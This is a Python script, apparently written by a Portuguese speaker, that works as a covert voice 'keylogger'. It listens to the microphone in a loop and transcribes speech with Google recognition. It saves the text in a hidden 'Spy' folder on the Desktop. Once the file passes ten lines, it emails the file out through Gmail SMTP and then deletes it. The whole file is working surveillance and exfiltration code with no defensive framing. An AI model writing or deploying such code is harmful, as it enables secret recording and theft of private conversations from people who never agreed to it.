import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from mysenha import passwd
from pathlib import Path
import os
from pip import main
import speech_recognition as sr
import pyttsx3
from time import sleep
from email import encoders

audio = sr.Recognizer()
maquina = pyttsx3.init()

try:
    desktop = Path.home() / 'Desktop'
    os.makedirs(f'{desktop}\\Spy')
except:
    pass
def captura():
    try:
        global comando
        with sr.Microphone() as spy:
            voz = audio.listen(spy)
            comando = audio.recognize_google(voz, language='pt-BR')
            comando = comando.lower()
            print(comando)
            maquina.runAndWait()
    except:
        captura()
def salva():
    maximo_de_linhas = 10
    with open(f'{desktop}\\Spy\\Spytxt.txt', 'a') as arquivo:
        arquivo.write(str(f'\n{comando}'))
    with open(f'{desktop}\\Spy\\Spytxt.txt') as myfile:
        total_lines = sum(1 for line in myfile)
        print(total_lines)
    if total_lines > maximo_de_linhas:
        Email()

def Email():
    global desktop
    try:
        host = 'smtp.gmail.com'
        port = '587'
        login = 'your_login@gmail.com'
        senha = passwd
        server = smtplib.SMTP(host, port)

        msg = MIMEMultipart()
        msg['From'] = login
        msg['To'] = login
        msg['subject'] = 'Keyloggeerr'

        corpo = 'Keylogger_Voz'

        msg.attach(MIMEText(corpo, 'plain'))

        caminho_arq = f'{desktop}\\Spy\\Spytxt.txt'
        attachment = open(caminho_arq, 'rb')

        part = MIMEBase('aplication', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % caminho_arq)

        msg.attach(part)

        attachment.close()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(login, senha)
        text = msg.as_string()
        server.sendmail(login, login, text)
        server.quit()
        print('\nEmail enviado com sucesso!')
        os.remove(caminho_arq)
    except:
        pass

def main():
    captura()
    salva()

while True:
    if __name__ == '__main__':
        main()